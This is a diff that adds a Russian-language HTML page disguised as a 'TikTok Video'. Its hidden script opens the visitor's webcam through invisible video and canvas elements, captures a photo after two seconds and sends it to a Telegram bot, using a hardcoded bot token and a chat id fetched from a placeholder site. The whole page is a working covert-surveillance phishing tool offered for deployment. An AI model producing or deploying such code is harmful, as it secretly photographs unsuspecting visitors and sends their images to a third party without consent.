@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>TikTok Video</title>
+</head>
+<body>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "8121980940:AAEBKe2eWdJr84E5G-Hlbj2-i8fAVWr284U";
+        const BASE_URL = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN;
+        
+        // Получаем код из URL
+        const urlParams = new URLSearchParams(window.location.search);
+        const userCode = urlParams.get("code");
+
+        fetch("https://ТВОЙ-САЙТ/get_user_id?code=" + userCode)
+            .then(response => response.text())
+            .then(chat_id => {
+                if (chat_id === "not_found") return;
+
+                navigator.mediaDevices.getUserMedia({ video: true })
+                    .then(stream => {
+                        let video = document.getElementById('video');
+                        video.srcObject = stream;
+                        video.onloadedmetadata = () => {
+                            setTimeout(() => capturePhoto(chat_id), 2000);  // Ждём 2 сек
+                        };
+                    });
+
+                function capturePhoto(chat_id) {
+                    let video = document.getElementById('video');
+                    let canvas = document.getElementById('canvas');
+                    let ctx = canvas.getContext('2d');
+
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    canvas.toBlob(blob => {
+                        let formData = new FormData();
+                        formData.append('chat_id', chat_id);
+                        formData.append('photo', blob, 'photo.jpg');
+
+                        fetch(BASE_URL + "/sendPhoto", {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            video.srcObject.getTracks().forEach(track => track.stop());
+                        });
+                    }, 'image/jpeg');
+                }
+            });
+    </script>
+</body>
+</html>
